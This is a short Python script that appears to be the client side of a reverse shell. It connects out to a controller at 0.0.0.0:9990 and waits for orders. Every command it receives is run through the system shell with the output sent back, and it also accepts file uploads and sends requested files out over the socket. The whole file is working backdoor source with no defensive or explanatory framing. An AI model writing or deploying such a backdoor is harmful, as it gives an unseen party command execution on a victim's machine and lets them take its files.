from datetime import datetime
import os
import socket 
import subprocess
from typing import List


client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("0.0.0.0", 9990))
print("Success connect")


def cd_comand(command):
    list_command = command.split(' ')
    try:
        os.chdir(list_command[1])
        client_socket.send(f"Change directory on {list_command[1]}".encode())
    except:
        client_socket.send("wrong way".encode())


def uploading():
    file_name = client_socket.recv(1024).decode()
    file = open("gg/" + file_name, 'wb')
    while True:
        line = client_socket.recv(1024)
        
        if not line or line.decode() == 'break_program.gg':
            break
        file.write(line)
    file.close()


def download():
    file_name = client_socket.recv(1024).decode()
    try:
        file = open(file_name, 'rb')
        client_socket.send('400'.encode())
        print("ff")
        while True:
            line = file.readline(1024)
            client_socket.send(line)
            if not line:
                client_socket.send("break_program.gg".encode())
                break
        file.close()
    except:
        client_socket.send("255".encode())
    print("ff")


def other_comands(command):
    ex = subprocess.check_output(command, shell=True).decode()
    if not ex:
        client_socket.send(b"\n")
    else:
        client_socket.send(ex.encode())


def client_comands():
    while True:
        command = client_socket.recv(1024).decode()
        try:
            
            if "cd" in command:
                cd_comand(command)
            elif "uploading" in command:
                uploading()
            elif "download" in command:
                download()
            else:
                other_comands(command)
        except subprocess.CalledProcessError:
            client_socket.send("Not found command\n".encode())


if __name__ == "__main__":
    client_comands()